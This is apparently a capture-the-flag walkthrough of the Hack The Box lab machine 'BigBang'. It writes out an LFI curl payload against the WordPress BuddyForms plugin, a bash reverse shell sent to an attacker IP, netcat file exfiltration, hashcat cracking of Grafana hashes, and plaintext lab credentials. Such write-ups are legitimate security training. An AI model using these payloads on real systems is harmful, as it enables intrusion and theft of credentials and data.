🚀 Hack The Box — BigBang (Hard) 🧠

IP: 10.10.11.52Difficulty: HardCategory: Web, Privilege EscalationAuthor: Tabish (Paraphrased + Enhanced)

🧽 Initial Recon

We begin with full-port scanning to uncover all open services.

nmap -sV -A -T4 -p- 10.10.11.52 -oN port_scan

🔎 Ports Identified:

22/tcp — SSH

80/tcp — HTTP

Port 80 redirects to http://blog.bigbang.htb.We update /etc/hosts accordingly:

echo "10.10.11.52 blog.bigbang.htb" | sudo tee -a /etc/hosts

🌐 Web Enumeration

The target serves a WordPress blog. We conduct further enumeration using:

wpscan --url http://blog.bigbang.htb --enumerate p

Findings:

WordPress version 6.5.4

Plugin: BuddyForms — known vulnerable to LFI via upload_image_from_url.

📂 Exploiting LFI to Extract Config

Use the vulnerable BuddyForms plugin to read wp-config.php:

curl 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' \
  -d 'action=upload_image_from_url&url=php://filter/convert.base64-encode/resource=../wp-config.php&id=1&accepted_files=image/gif'

Decode the base64 output to retrieve database credentials.

🧬 Shell Access (RCE via Plugin)

Using the plugin's upload endpoint for RCE:

python3 rce.py http://blog.bigbang.htb/wp-admin/admin-ajax.php \
  'bash -c "bash -i >& /dev/tcp/10.10.16.65/9092 0>&1"'

Listener on attack machine:

nc -lvnp 9092

Successfully captured a reverse shell. Extracted DB credentials from WordPress.

✅ Credentials:

Username: shawking

Password: quantumphysics

Logged in via SSH:

ssh shawking@10.10.11.52

Collected user flag at /home/shawking/user.txt.

⬆️ Privilege Escalation to Root

While exploring, we notice a snap directory, but nothing exploitable.

We shift focus to Grafana, likely running locally.

Using netstat, we confirm Grafana is listening internally. We forward the port and extract the database:

sqlite3 grafana.db
SELECT login, password FROM user;

Extracted password hashes.

💥 Cracked the hashes:

Cloned grafana2hashcat, moved hashes and ran:

hashcat -m 12100 -a 0 hashes.txt rockyou.txt

✅ Credentials:

Username: developer

Password: bigbang

SSH into new user:

ssh developer@10.10.11.52

🚁 Android APK & Root

Discovered /opt/android/satellite.apk.

Transferred the APK to attacker machine via netcat:

# On attacker
nc -lvnp 9001 > satellite.apk

# On target
nc <attacker-ip> 9001 < satellite.apk

Decompiled the APK and found an access token.

Using this token in a crafted curl request, escalated to root privileges.

Collected root.txt.

🌟 Final Notes

📂 Gained initial access via BuddyForms plugin LFI + RCE

🔐 Escalated privileges using Grafana DB extraction and APK token abuse

🔑 Two sets of credentials cracked using hashcat

🧠 Solid chaining of WordPress > Plugin Exploits > RCE > SSH > Grafana > APK Token > Root

Rooted 🎯 BigBang (HTB) like a beast. 💀
